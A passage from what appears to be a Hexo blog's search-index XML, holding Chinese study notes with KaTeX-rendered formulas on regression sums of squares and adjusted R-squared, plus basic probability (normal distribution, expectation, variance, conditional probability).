stretchy="false">)</mo><mn>2</mn></msup><mo separator="true">,</mo><mi>S</mi><msub><mi>S</mi><mi>E</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>i</mi></munder><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msub><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">SS_T=\sum_{i}(y_i-\bar{y})^2,SS_R=\sum_{i}(\hat{y}_i-\bar{y})^2,SS_E=\sum_{i}(y_i-\bar{y}_i)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.327674em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.327674em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.327674em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>R随着自变量数量增加而增大，R平方跟样本量是有关系的。因此做了以下修正：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>R</mi><mrow><mi>a</mi><mi>d</mi><mi>j</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow><mn>2</mn></msubsup><mo>=</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msup><mi>R</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>N</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mrow><mi>N</mi><mo>−</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">R^2_{adjusted}=1-\frac{(1-R^2)(N-1)}{N-p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2472159999999999em;vertical-align:-0.383108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-2.4530000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mord mathdefault mtight">u</span><span class="mord mathdefault mtight">s</span><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">d</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.371548em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>where:<br />R^2 = sample R-square<br />p=Number of predictors<br />N=Total sample size</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论</title>
      <link href="/2020/06/25/%E6%A6%82%E7%8E%87%E8%AE%BA/"/>
      <url>/2020/06/25/%E6%A6%82%E7%8E%87%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>概率的记录</p></blockquote><a id="more"></a><h2 id="概率论基础"><a class="markdownIt-Anchor" href="#概率论基础"></a> 概率论基础</h2><ul><li>概率<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></li><li>分布函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Φ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo>&lt;</mo><mo>=</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\Phi(x)=P(x&lt;=x_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Φ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul><h2 id="常见概率"><a class="markdownIt-Anchor" href="#常见概率"></a> 常见概率</h2><h3 id="正态分布"><a class="markdownIt-Anchor" href="#正态分布"></a> 正态分布</h3><ul><li>概率密度方程：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mtext> </mtext><mi>N</mi><mo stretchy="false">(</mo><mi>μ</mi><mo separator="true">,</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X~N(\mu,\sigma^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord mathdefault">μ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><msqrt><mrow><mn>2</mn><mi>π</mi><msup><mi>σ</mi><mn>2</mn></msup></mrow></msqrt></mfrac><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><mo>−</mo><mfrac><mn>1</mn><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mi>μ</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(X)=\frac{1}{\sqrt{2\pi\sigma^2}}\exp(-\frac{1}{2\sigma^2}(x-\mu)^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.383108em;vertical-align:-0.5379999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.5153525em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9637821428571429em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight">2</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.923782142857143em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.07621785714285711em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5379999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">exp</span><span class="mopen">(</span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">μ</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>期望：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><mi>X</mi><mo stretchy="false">]</mo><mo>=</mo><mi>μ</mi></mrow><annotation encoding="application/x-tex">E[X]=\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">μ</span></span></span></span></li><li>方差：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">[</mo><mi>X</mi><mo stretchy="false">]</mo><mo>=</mo><msup><mi>σ</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">Var[X]=\sigma^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></li></ul><h2 id="概率论概念"><a class="markdownIt-Anchor" href="#概率论概念"></a> 概率论概念</h2><ul><li><strong>条件概率：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi mathvariant="normal">∣</mi><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi>B</mi><mo stretchy="false">)</mo></mrow><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">P(A|B)=\frac{P(AB)}{P(B)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 